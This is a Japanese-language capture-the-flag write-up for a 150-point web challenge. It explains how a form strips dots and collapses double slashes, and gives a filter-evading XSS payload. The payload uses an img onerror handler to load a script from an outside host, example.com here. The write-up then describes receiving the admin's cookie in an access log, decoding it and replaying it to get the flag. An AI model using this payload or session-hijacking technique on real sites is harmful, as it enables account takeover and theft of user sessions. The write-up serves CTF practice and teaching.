# Wallowing Wallabies - Part Three
Category: Web
Point: 150

## Question
And for the last challenge, can you get the last token? Same website as [before](https://wallowing-wallabies.ctfcompetition.com/)

## FLAG
`CTF{intents_is_the_INTENTed_way_to_solve_some_an_android_level}`

## Answer
Wallowing Wallabies - Part One，およびPart Twoの続きで，`/deep-blue-sea/team/characters`ページに新しいフォームが追加されている．

`Title`の方に，適当に値を入力して送信してみると，`.`が抜け落ちることと`//`が`/`に置換されることがわかる．
そのため，`.`を使わない方法を考えるのと，`//`を入力したい場合は`////`とする必要がある．

`.`を使わない方法はいくつか考えられるが，JavaScriptでは，連想配列のようにオブジェクトのメソッドを呼ぶことが出来るため，下記はそれを利用している．
```html
<img src=0 onerror="document['write']('<script src='+'https:////' + ['www', 'example', 'com']['join'](String['fromCharCode'](46)) + '/' + ['external', 'js']['join'](String['fromCharCode'](46))+'></script>')">
```

フォームに送信してから，しばらくすると，WebサーバのアクセスログにCookieの情報が乗ったアクセスが届く．  
`green-mountains=eyJub25jZSI6ImIxYzNiNjE5ZTgxOWQ1OWYiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vcGFyYWdyYXBoLiokIiwiZXhwaXJ5IjoxNDYyMTIxODYwfQ==|1462121857|f3e2dd94ff3d1b252f0d9f98a7a5757e66fa41c3`

`|`で三区分された一つ目の文字列をデコードしてみる．
```bash
$ echo 'eyJub25jZSI6ImIxYzNiNjE5ZTgxOWQ1OWYiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vcGFyYWdyYXBoLiokIiwiZXhwaXJ5IjoxNDYyMTIxODYwfQ==' | base64 -D
{"nonce":"b1c3b619e819d59f","allowed":"^/deep-blue-sea/team/paragraph.*$","expiry":1462121860}
```

上記のCookieの値をセットして，`paragraphs`ページをアクセスすると，フラグが表示される．

## Author
GitHub: @asakasa
